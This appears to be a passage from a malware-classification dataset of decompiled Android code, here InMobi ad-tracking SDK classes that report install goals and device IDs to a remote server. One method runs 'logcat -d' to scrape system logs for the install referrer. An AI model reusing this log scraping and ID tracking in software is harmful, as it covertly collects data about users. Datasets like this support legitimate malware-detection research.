"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.events\AnalyticsEventsWrapper.code","public final class AnalyticsEventsWrapper {   private static AnalyticsEventsWrapper a;   private static boolean c=false;   private AnalyticsEventsQueue b;   public enum IMItemType {  CONSUMABLE,   DURABLE,   PERSONALIZATION}   public enum IMSectionStatus {  COMPLETED,   FAILED,   CANCELED}   public static boolean isEventsUser(){     return c;   }   public static void setIsEventsUser(){     c=true;   }   private AnalyticsEventsWrapper(){   }   public static synchronized AnalyticsEventsWrapper getInstance(){     AnalyticsEventsWrapper analyticsEventsWrapper; synchronized (AnalyticsEventsWrapper.class) {       if (AnalyticsUtils.getWebviewUserAgent() == null) {         AnalyticsUtils.setWebviewUserAgent(InternalSDKUtil.getUserAgent(InternalSDKUtil.getContext()));       }       if (a == null) {         a=new AnalyticsEventsWrapper();         AnalyticsUtils.setStartHandle(false);         AnalyticsNetworkManager.startInstance();       }       a.b=AnalyticsEventsQueue.getInstance();       analyticsEventsWrapper=a;     }     return analyticsEventsWrapper;   }   public void startSession(  String str,  Map<String,String> map){     if (str == null || str.trim().equals("""")) {       a(""appid cannot be null or empty"");       return;     }     try {       this.b.addElement(new FunctionStartSession(InternalSDKUtil.getContext(),str,map));       this.b.processFunctions();     }  catch (    Exception e) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Init exception"",e);     }   }   public void endSession(  Map<String,String> map){     try {       this.b.addElement(new FunctionEndSession(InternalSDKUtil.getContext(),map));       this.b.processFunctions();     }  catch (    Exception e) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""End Session Exception"",e);     }   }   public void beginSection(  int i,  String str,  Map<String,String> map){     if (str == null) {       a(""arguments cannot be null"");       return;     }     try {       if (a()) {         this.b.addElement(new FunctionLevelBegin(InternalSDKUtil.getContext(),i,str,map));         this.b.processFunctions();       }     }  catch (    Exception e) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Begin Section Exception"",e);     }   }   public void endSection(  int i,  String str,  Map<String,String> map){     if (str == null) {       a(""arguments cannot be null"");       return;     }     try {       if (a()) {         this.b.addElement(new FunctionLevelEnd(InternalSDKUtil.getContext(),i,str,null,map));         this.b.processFunctions();       }     }  catch (    Exception e) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""End Section Exception"",e);     }   }   public void tagTransactionManually(  Intent intent,  Bundle bundle){     if (intent == null) {       a(""transaction intent cannot be null or empty"");       return;     }     try {       if (a()) {         this.b.addElement(new FunctionTagTransaction(InternalSDKUtil.getContext(),intent,bundle));         this.b.processFunctions();       }     }  catch (    Exception e) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Tag Transaction Manually Exception"",e);     }   }   public void tagEvent(  String str,  Map<String,String> map){     if (str == null || str.trim().equals("""")) {       a(""arguments cannot be null or empty"");       return;     }     try {       if (a()) {         this.b.addElement(new FunctionTagEvent(InternalSDKUtil.getContext(),str,map));         this.b.processFunctions();       }     }  catch (    Exception e) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Tag Event Exception"",e);     }   }   private void a(  String str){     Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""IllegalArgumentException"",new IllegalArgumentException(str));   }   private boolean a(){     if (InternalSDKUtil.getContext() != null && SessionInfo.getSessionId(InternalSDKUtil.getContext()) == null) {       startSession(InMobi.getAppId(),null);     }  else     if (SessionInfo.getSessionId(InternalSDKUtil.getContext()) == null) {       Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,AnalyticsUtils.INITIALIZE_NOT_CALLED);       return false;     }     return true;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl\AdTrackerConstants.code","public class AdTrackerConstants {   public static final String ADTRACKER_ERROR=""iatError"";   public static final String ANDROID=""and"";   public static final String APPVER=""appVer"";   public static final String APP_ID=""appId"";   public static final String BLANK="""";   public static final String CONNECTIVITY_INTENT_ACTION=""android.net.conn.CONNECTIVITY_CHANGE"";   public static final String ERROR=""err"";   public static final String ERRORCODE=""errcode"";   public static final String ERRORMSG=""errmsg"";   public static final int EXCEPTION=424;   public static final String GOALCOUNT=""goalCount"";   public static final String GOALNAME=""goalName"";   public static final String GOAL_DOWNLOAD=""download"";   public static final String IAT=""iat"";   public static final int IATLENGTH=7;   public static final String IATNAMESPACE=""iatsdk"";   public static final String IAT_DOWNLOAD_INSERT_STATUS=""insertStatus"";   public static final String IAT_DOWNLOAD_STATUS=""uploadStatus"";   public static final String IAT_LOGGING_TAG=""[InMobi]-[AdTracker]-4.1.1"";   public static final String IAT_REFERRER_STATUS=""referrerStatus"";   public static final String IMGOAL_FILE=""eventlog"";   public static final String IMPREF_FILE=""IMAdTrackerStatusUpload"";   public static final String KEY_FIRST_GOAL_SUCCESS=""goalPingSuccess"";   public static final String KEY_REFERRER_FROM_LOGCAT=""rlc"";   public static final String KEY_REF_WAIT=""referrerWaitTime"";   public static final String KEY_T1=""t1"";   public static final String KEY_T2=""t2"";   public static final String KEY_UNSTABLE_NETWORK=""nus"";   public static final String LATE_PING=""lp"";   public static final String MSG_APP_CONTEXT_NULL=""context cannot be null"";   public static final String MSG_APP_ID_EMPTY=""appId cannot be blank"";   public static final String MSG_APP_ID_NULL=""appId cannot be null"";   public static final String MSG_INITIALIZATION_INCOMPLETE=""Please call init() with valid context and app id"";   public static final String MSG_INVALID_CUSTOM_GOAL=""Download Goal should be reported using reportAppDownloadGoal().."";   public static final String MSG_INVALID_GOAL=""Please pass a valid GoalName"";   public static final String MSG_OPTIONAL_PERM_MISSING=""Add android.permission.READ_LOGS permission in Android Manifest"";   public static final String MSG_PERMISSION_MISSING=""Add android.permission.INTERNET and android.permission.ACCESS_NETWORK_STATE permission in Android manifest"";   public static final int NETWORK_TIMEOUT=408;   public static final String OS_VERSION=""osV"";   public static final String REFERRER=""referrer"";   public static final String REFERRER_DELAY=""rd"";   public static final String REFERRER_FROM_SDK=""rfs"";   public static final String REFERRER_INTENT_ACTION=""com.android.vending.INSTALL_REFERRER"";   public static final String RESPONSE=""res"";   public static final String SDKREL_VER=""sdkRelVer"";   public static final String SDKVER=""sdkVer"";   public static final int SERVER_BADREQUEST=6002;   public static final int SERVER_INVALIDAPPID=6003;   public static final int SERVER_NOERROR=6000;   public static final int SERVER_RELOAD_WEBVIEW=6001;   public static final String SOURCE=""src"";   public static final String TESTMODE_INTENT=""action.inmobi.ADTRACKER"";   public static final String TIMESTAMP=""timeStamp"";   public static final String TIMETOLIVE=""timetoLive"";   public static final String UDID=""udid"";   public static final String UIDKEY=""u-id-key"";   public static final String UIDMAP=""u-id-map"";   public static final String UKEYVER=""u-key-ver"";   public static final String VALIDIDS=""iat_ids"";   public static final String WAIT_FOR_REFERRER=""waitForReferrer"";   public static final int WEBVIEW_INVALIDJSON=5005;   public static final int WEBVIEW_INVALIDPARAM=5001;   public static final int WEBVIEW_NOERROR=5000;   public static final int WEBVIEW_SERVERERROR=5004;   public static final int WEBVIEW_TIMEOUT=5003;   public static final int WEBVIEW_XMLHTTPSUPPORT=5002;   public enum StatusCode {  APP_ANALYTICS_UPLOAD_SUCCESS,   APP_CONTEXT_NULL,   APP_ANALYTICS_PREVIOUSLY_UPLOADED,   ODIN1_NULL,   APP_ANALYTICS_UPLOAD_FAILURE,   APP_NOT_CONNECTED,   RELOAD_WEBVIEW_ERROR} } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl\AdTrackerUtils.code","public class AdTrackerUtils {   public static boolean updateStatus(){     if (InternalSDKUtil.getContext() == null) {       return false;     }     FileOperations.setPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.IAT_DOWNLOAD_STATUS,true);     return true;   }   public static boolean resetStatus(){     if (InternalSDKUtil.getContext() == null) {       return false;     }     FileOperations.setPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.IAT_DOWNLOAD_STATUS,false);     return true;   }   public static boolean isPermissionGranted(  String str){     try {     }  catch (    Exception e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Cant check permissions"",e);     }     if (InternalSDKUtil.getContext().checkCallingOrSelfPermission(str) == 0) {       return true;     }     return false;   }   public static boolean sendBroadcastMessage(  int i){     try {       Intent intent=new Intent();       intent.setAction(AdTrackerConstants.TESTMODE_INTENT);       intent.putExtra(AdTrackerConstants.ADTRACKER_ERROR,i);       InternalSDKUtil.getContext().sendBroadcast(intent);       return true;     }  catch (    Exception e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Cant send test broadcast"",e);       return false;     }   }   public static boolean checkDownloadGoalUploaded(){     if (InternalSDKUtil.getContext() != null) {       return FileOperations.getBooleanPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.IAT_DOWNLOAD_STATUS);     }     Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Application Context NULL cannot checkStatusUpload"");     return false;   }   public static boolean checkDownloadGoalAdded(){     if (InternalSDKUtil.getContext() != null) {       return FileOperations.getBooleanPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.IAT_DOWNLOAD_INSERT_STATUS);     }     Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Application Context NULL cannot checkStatusUpload"");     return false;   }   public static void reportMetric(  AdTrackerEventType adTrackerEventType,  Goal goal,  int i,  long j,  int i2,  String str){     try {       if (AdTrackerNetworkInterface.isMetricSample()) {         if (AdTrackerEventType.GOAL_SUCCESS.equals(adTrackerEventType)) {           JSONObject jSONObject=new JSONObject();           jSONObject.put(""g"",goal.getGoalName());           jSONObject.put(""n"",goal.getRetryCount());           jSONObject.put(""t"",j);           jSONObject.put(""r"",i);           AdTrackerInitializer.getLogger().logEvent(new EventLog(AdTrackerEventType.GOAL_SUCCESS,jSONObject));           return;         }         if (AdTrackerEventType.GOAL_FAILURE.equals(adTrackerEventType)) {           JSONObject jSONObject2=new JSONObject();           jSONObject2.put(""g"",goal.getGoalName());           jSONObject2.put(""n"",goal.getRetryCount());           jSONObject2.put(""e"",i2);           if (str != null) {             jSONObject2.put(""m"",str);           }           AdTrackerInitializer.getLogger().logEvent(new EventLog(AdTrackerEventType.GOAL_FAILURE,jSONObject2));           return;         }         JSONObject jSONObject3=new JSONObject();         jSONObject3.put(""g"",goal.getGoalName());         jSONObject3.put(""n"",goal.getRetryCount());         AdTrackerInitializer.getLogger().logEvent(new EventLog(AdTrackerEventType.GOAL_DUMPED,jSONObject3));       }     }  catch (    Exception e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Error reporting metric"",e);     }   }   public static String getReferrerFromLogs(){     String str;     Exception e;     String[] strArr={""logcat"",""-d"",""ActivityManager:I""};     try {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Getting referrer from logs"");       Pattern compile=Pattern.compile(AdTrackerInitializer.getConfigParams().getLogcatPattern());       BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(strArr).getInputStream()));       str=null;       while (true) {         try {           String readLine=bufferedReader.readLine();           if (readLine == null) {             break;           }           Matcher matcher=compile.matcher(readLine);           if (matcher.find()) {             str=matcher.group(1);           }         }  catch (        Exception e2) {           e=e2;           Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Getting referrer from logs failed"",e);           return str;         }       }       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Received referrer from logs: "" + str);     }  catch (    Exception e3) {       str=null;       e=e3;     }     return str;   }   public static void setInternalReferrer(  Context context,  String str){     try {       if (context == null || str == null) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Cannot set Market Referrer..Referrer NULL"");         return;       }       if (0 == FileOperations.getLongPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.KEY_T2)) {         FileOperations.setPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.KEY_T2,System.currentTimeMillis());       }       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Saving referrer from broadcast receiver: "" + str);       FileOperations.setPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.REFERRER,str);       FileOperations.setPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.KEY_REFERRER_FROM_LOGCAT,""0"");       String preferences=FileOperations.getPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.APP_ID);       if (preferences == null || """".equals(preferences.trim())) {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Initialization incomplete. Please call InMobi initialize with a valid app Id"");         return;       }       if (FileOperations.getBooleanPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.WAIT_FOR_REFERRER)) {         InternalSDKUtil.setContext(context);         AdTrackerNetworkInterface.init();         AdTrackerNetworkInterface.getGoalList().addGoal(AdTrackerConstants.GOAL_DOWNLOAD,1,0L,0,true);         AdTrackerNetworkInterface.reportToServer(preferences);       }       AdTrackerNetworkInterface.notifyThread();     }  catch (    Exception e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Cannot set referrer"",e);     }   }   public static void setReferrerFromLogs(  Context context,  String str){     try {       if (context == null || str == null) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Cannot set Market Referrer from logs..Referrer NULL"");         return;       }       if (0 == FileOperations.getLongPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.KEY_T2)) {         FileOperations.setPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.KEY_T2,System.currentTimeMillis());       }       FileOperations.setPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.REFERRER,str);       FileOperations.setPreferences(context.getApplicationContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.KEY_REFERRER_FROM_LOGCAT,""1"");     }  catch (    Exception e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Cannot set referrer from logs"",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl\Goal.code","public class Goal implements Serializable {   private int a;   private String b;   private long c;   private int d;   private boolean e;   public Goal(){     setGoalCount(0);     setGoalName(null);     setRetryTime(0L);     setRetryCount(0);     setDuplicateGoal(false);   }   public Goal(  String str,  int i,  long j,  int i2,  boolean z){     if (i < 0) {       setGoalCount(0);     }  else {       setGoalCount(i);     }     if (j < 0) {       setRetryTime(0L);     }  else {       setRetryTime(j);     }     if (i2 < 0) {       setRetryCount(0);     }  else {       setRetryCount(i2);     }     setGoalName(str);     setDuplicateGoal(z);   }   public int getGoalCount(){     return this.a;   }   public final void setGoalCount(  int i){     this.a=i;   }   public String getGoalName(){     return this.b;   }   public final void setGoalName(  String str){     this.b=str;   }   public long getRetryTime(){     return this.c;   }   public final void setRetryTime(  long j){     this.c=j;   }   public int getRetryCount(){     return this.d;   }   public final void setRetryCount(  int i){     this.d=i;   }   public boolean isDuplicateGoal(){     return this.e;   }   public final void setDuplicateGoal(  boolean z){     this.e=z;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl\GoalList.code","public class GoalList extends Vector<Goal> {   public static GoalList getLoggedGoals(){     GoalList goalList=null;     if (FileOperations.isFileExist(InternalSDKUtil.getContext(),AdTrackerConstants.IMGOAL_FILE)) {       goalList=(GoalList)FileOperations.readFromFile(InternalSDKUtil.getContext(),AdTrackerConstants.IMGOAL_FILE);     }     if (goalList == null) {       return new GoalList();     }     return goalList;   }   public void saveGoals(){     FileOperations.saveToFile(InternalSDKUtil.getContext(),AdTrackerConstants.IMGOAL_FILE,this);   }   public Goal getGoal(  String str){     if (str == null || """".equals(str.trim())) {       Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""GoalName is null"");       return null;     }     try {       Iterator<Goal> it=iterator();       while (it.hasNext()) {         Goal next=it.next();         if (next.getGoalName().equals(str)) {           return next;         }       }       return null;     }  catch (    Exception e) {       return null;     }   }   public boolean removeGoal(  String str,  int i){     AdTrackerNetworkInterface.setSynced(false);     if (str == null || """".equals(str.trim())) {       Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""GoalName is null"");       return false;     }     if (i < 1) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""GoalCount cannot be 0 or negative"");       return false;     }     Iterator it=iterator();     while (true) {       if (!it.hasNext()) {         break;       }       Goal goal=(Goal)it.next();       if (goal.getGoalName().equals(str)) {         int goalCount=goal.getGoalCount() - i;         if (str.equals(AdTrackerConstants.GOAL_DOWNLOAD)) {           remove(goal);         }  else         if (goalCount <= 0) {           remove(goal);         }  else {           goal.setGoalCount(goalCount);         }       }     }     return true;   }   public boolean addGoal(  String str,  int i,  long j,  int i2,  boolean z){     boolean z2;     AdTrackerNetworkInterface.setSynced(false);     if (str == null || """".equals(str.trim())) {       Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""GoalName is null"");       return false;     }     if (i < 1 || j < 0) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""GoalCount cant be 0 or RetryTime cannot be negative"");       return false;     }     try {       Iterator<Goal> it=iterator();       while (true) {         if (!it.hasNext()) {           z2=false;           break;         }         Goal next=it.next();         if (next.getGoalName().equals(str)) {           if (!AdTrackerConstants.GOAL_DOWNLOAD.equals(str)) {             next.setGoalCount(next.getGoalCount() + i);           }           next.setRetryCount(i2);           next.setRetryTime(j);           next.setDuplicateGoal(z);           z2=true;         }       }       if (!z2) {         add(new Goal(str,i,j,i2,z));       }       return true;     }  catch (    Exception e) {       return false;     }   }   public boolean increaseRetryTime(  String str,  int i,  boolean z){     long j;     if (str != null) {       try {       }  catch (      Exception e) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Cant increase retry time"",e);       }       if (!"""".equals(str.trim())) {         Goal goal=getGoal(str);         int maxWaitTime=AdTrackerInitializer.getConfigParams().getRetryParams().getMaxWaitTime();         int maxRetry=AdTrackerInitializer.getConfigParams().getRetryParams().getMaxRetry();         if (goal != null) {           long retryTime=goal.getRetryTime();           int retryCount=goal.getRetryCount();           if (retryTime < maxWaitTime) {             j=(retryTime * 2) + 30000;             if (j > maxWaitTime) {               j=maxWaitTime;             }           }  else {             j=maxWaitTime;           }           removeGoal(str,i);           int i2=retryCount + 1;           if (i2 < maxRetry) {             addGoal(str,i,j,i2,z);           }  else {             AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_DUMPED,goal,0,0L,0,null);           }           return true;         }         return false;       }     }     Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""GoalName cannot be null"");     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.config\a.code","class a implements CacheController.Validator {   @Override public boolean validate(  Map<String,Object> map){     boolean b;     b=AdTrackerInitializer.b((Map<String,Object>)map);     return b;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.config\AdTrackerConfigParams.code","public class AdTrackerConfigParams {   private static final String a=""Starting.*: Intent.*(?:http://market.android.com/details|market://details|play.google.com).*(?:id="" + InternalSDKUtil.getContext().getPackageName() + "").*referrer=([^&\\s]+)"";   private int b=60;   private int c=AdException.INVALID_REQUEST;   private String d=a;   private AdTrackerGoalRetryParams e=new AdTrackerGoalRetryParams();   private MetricConfigParams f=new MetricConfigParams();   private UID g=new UID();   public int getConnectionTimeout(){     return this.b * 1000;   }   public int getWebviewTimeout(){     return this.c * 1000;   }   public int getReferrerWaitTime(){     return 300000;   }   public int getReferrerWaitTimeRetryCount(){     return 3;   }   public int getReferrerWaitTimeRetryInterval(){     return 5000;   }   public String getLogcatPattern(){     return this.d;   }   public AdTrackerGoalRetryParams getRetryParams(){     return this.e;   }   public MetricConfigParams getMetric(){     return this.f;   }   public UID getUID(){     return this.g;   }   public void setFromMap(  Map<String,Object> map){     this.b=InternalSDKUtil.getIntFromMap(map,""cto"",1,2147483647L);     this.c=InternalSDKUtil.getIntFromMap(map,""wto"",1,2147483647L);     this.d=InternalSDKUtil.getStringFromMap(map,""rlp"").replace(""$PKG"",InternalSDKUtil.getContext().getPackageName());     this.e.setFromMap((Map)map.get(""rp""));     this.f.setFromMap((Map)map.get(""metric""));     this.g.setFromMap((Map)map.get(""ids""));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.config\AdTrackerGoalRetryParams.code","public class AdTrackerGoalRetryParams {   private int a=1000;   private int b=900;   public int getMaxWaitTime(){     return this.b * 1000;   }   public int getMaxRetry(){     return this.a;   }   public void setFromMap(  Map<String,Object> map){     this.a=InternalSDKUtil.getIntFromMap(map,""mr"",0,2147483647L);     this.b=InternalSDKUtil.getIntFromMap(map,""mw"",0,2147483647L);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.config\AdTrackerInitializer.code","public class AdTrackerInitializer {   public static final String PRODUCT_IAT=""iat"";   private static Context a=null;   private static Map<String,String> b=new HashMap();   private static AdTrackerConfigParams c=new AdTrackerConfigParams();   private static Logger d=new Logger(2,""iat"");   private static CacheController.Validator e=new a();   public static AdTrackerConfigParams getConfigParams(){     if (InternalSDKUtil.getContext() != null && InMobi.getAppId() != null) {       b(InternalSDKUtil.getContext());     }     d.setMetricConfigParams(c.getMetric());     return c;   }   public static Logger getLogger(){     return d;   }   private static void a(  Context context){     if (context != null && a == null) {       if (a == null) {         a=context.getApplicationContext();         b=getUidMap(context);         try {           b(CacheController.getConfig(""iat"",context,b,e).getData());           return;         }  catch (        Exception e2) {           Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Exception while retreiving configs."");           return;         }       }       return;     }     if (a == null && context == null) {       a.getApplicationContext();     }   }   private static void b(  Context context){     a(context);     try {       CacheController.getConfig(""iat"",context,b,e);     }  catch (    Exception e2) {     }   }   public static Map<String,String> getUidMap(  Context context){     return UIDUtil.getMap(a,c.getUID());   }   public static boolean b(  Map<String,Object> map){     b=getUidMap(a);     Map<String,Object> populateToNewMap=InternalSDKUtil.populateToNewMap((Map)map.get(""AND""),(Map)map.get(""common""),true);     try {       AdTrackerConfigParams adTrackerConfigParams=new AdTrackerConfigParams();       adTrackerConfigParams.setFromMap(populateToNewMap);       c=adTrackerConfigParams;       return true;     }  catch (    Exception e2) {       return false;     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.net\a.code","static class a implements Runnable {   final String a;   a(  String str){     this.a=str;   }   @Override public void run(){     while (!AdTrackerNetworkInterface.c.get()) {       try {         AdTrackerNetworkInterface.a.saveGoals();         AdTrackerNetworkInterface.c.set(true);         if (AdTrackerNetworkInterface.a != null && !AdTrackerNetworkInterface.a.isEmpty()) {           while (!AdTrackerNetworkInterface.a.isEmpty()) {             try {               AdTrackerNetworkInterface.b(this.a);             }  catch (            Exception e) {               AdTrackerNetworkInterface.deinit();               return;             }           }           AdTrackerNetworkInterface.b.set(false);         }  else {           Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""GoalList Empty"");           AdTrackerNetworkInterface.deinit();           return;         }       }  catch (      Exception e2) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Exception reporting goals"",e2);         return;       }     }     AdTrackerNetworkInterface.deinit();   } } public class a implements Runnable {   a(){   }   @Override public void run(){     if (AdTrackerWebViewLoader.a != null) {       AdTrackerWebViewLoader.a.stopLoading();       AdTrackerWebViewLoader.a.destroy();       WebView unused=AdTrackerWebViewLoader.a=null;       AdTrackerWebViewLoader.b.set(false);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.net\AdTrackerNetworkInterface.code","public class AdTrackerNetworkInterface {   private static GoalList a;   private static AtomicBoolean c;   private static Thread d;   private static Handler e;   private static AdTrackerWebViewLoader h;   private static AtomicBoolean b=null;   private static AtomicBoolean f=null;   private static AtomicBoolean g=null;   private static boolean i=false;   private static int j=0;   private static String k=""https://d.appsdt.com/download/tracker/?"";   private static String l=""https://d.appsdt.com/sdkdwnldbeacon.html"";   private static String m=""https://d.appsdt.com/download/tracker/iatsdkconfs?"";   private static Timer n=new Timer();   public static String a(){     return k;   }   public static String b(){     return l;   }   public static int isUnstableNetwork(){     return j;   }   public static boolean isMetricSample(){     return i;   }   public static AtomicBoolean getWebviewUploadStatus(){     return g;   }   public static void setWebviewUploadStatus(  boolean z){     g.set(z);   }   public static Handler getUIHandler(){     return e;   }   public static Thread getNetworkThread(){     return d;   }   public static GoalList getGoalList(){     return a;   }   public static void setSynced(  boolean z){     c.set(z);   }   public static boolean isSynced(){     return c.get();   }   public static void init(){     if (a == null) {       a=GoalList.getLoggedGoals();     }     if (b == null) {       b=new AtomicBoolean(false);     }     c=new AtomicBoolean(false);     if (e == null) {       e=new Handler();     }     f=new AtomicBoolean(true);     g=new AtomicBoolean(false);   }   public static void deinit(){     if (b != null) {       b.set(false);     }     if (a != null && !a.isEmpty()) {       a.saveGoals();     }     c.set(false);     a=null;   }   public static synchronized AdTrackerConstants.StatusCode reportToServer(  String str){     AdTrackerConstants.StatusCode statusCode; synchronized (AdTrackerNetworkInterface.class) {       if (b.compareAndSet(false,true)) {         d=new Thread(new a(str));         d.setPriority(1);         d.start();       }       statusCode=AdTrackerConstants.StatusCode.APP_ANALYTICS_UPLOAD_SUCCESS;     }     return statusCode;   } static class a implements Runnable {     final String a;     a(    String str){       this.a=str;     }     @Override public void run(){       while (!AdTrackerNetworkInterface.c.get()) {         try {           AdTrackerNetworkInterface.a.saveGoals();           AdTrackerNetworkInterface.c.set(true);           if (AdTrackerNetworkInterface.a != null && !AdTrackerNetworkInterface.a.isEmpty()) {             while (!AdTrackerNetworkInterface.a.isEmpty()) {               try {                 AdTrackerNetworkInterface.b(this.a);               }  catch (              Exception e) {                 AdTrackerNetworkInterface.deinit();                 return;               }             }             AdTrackerNetworkInterface.b.set(false);           }  else {             Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""GoalList Empty"");             AdTrackerNetworkInterface.deinit();             return;           }         }  catch (        Exception e2) {           Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Exception reporting goals"",e2);           return;         }       }       AdTrackerNetworkInterface.deinit();     }   }   protected static boolean reportUsingNetwork(  String str,  Goal goal){     String goalName=goal.getGoalName();     try {       String preferences=FileOperations.getPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.VALIDIDS);       AdTrackerConstants.StatusCode statusCode=AdTrackerConstants.StatusCode.APP_ANALYTICS_UPLOAD_FAILURE;       AdTrackerConstants.StatusCode sendHTTPRequest=AdTrackerRequestResponseBuilder.sendHTTPRequest(str,goal,preferences);       if (AdTrackerConstants.StatusCode.APP_ANALYTICS_UPLOAD_SUCCESS == sendHTTPRequest) {         f.set(true);         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Successfully uploaded goal: "" + goalName);       }  else       if (AdTrackerConstants.StatusCode.RELOAD_WEBVIEW_ERROR == sendHTTPRequest) {         f.set(false);       }  else {         f.set(false);         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to upload goal: "" + goalName);       }     }  catch (    Exception e2) {       f.set(false);       Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to upload goal: "" + goalName);       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to report goal: "",e2);     }     return f.get();   }   public static void b(  String str){     try {       a.saveGoals();       i=AdTrackerInitializer.getLogger().startNewSample();       Goal goal=a.get(0);       if (!InternalSDKUtil.checkNetworkAvailibility(InternalSDKUtil.getContext())) {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Network Unavailable"");         j=1;         deinit();       }  else {         a(goal);         f();         a(str,goal);         FileOperations.setPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.WAIT_FOR_REFERRER,true);         j=0;       }     }  catch (    Exception e2) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to process IAT goals"",e2);     }   }   private static void a(  Goal goal){     try {       String goalName=goal.getGoalName();       long retryTime=goal.getRetryTime();       int maxWaitTime=AdTrackerInitializer.getConfigParams().getRetryParams().getMaxWaitTime();       if (true == f.get()) {         retryTime=0;       }  else       if (retryTime > maxWaitTime) {         retryTime=maxWaitTime;       }       if (retryTime > 0) {         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Retrying goalname: "" + goalName + "" after ""+ (retryTime / 1000)+ "" secs"");       } synchronized (d) {         Thread.sleep(retryTime);       }     }  catch (    Exception e2) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to reduce wait time exception"",e2);   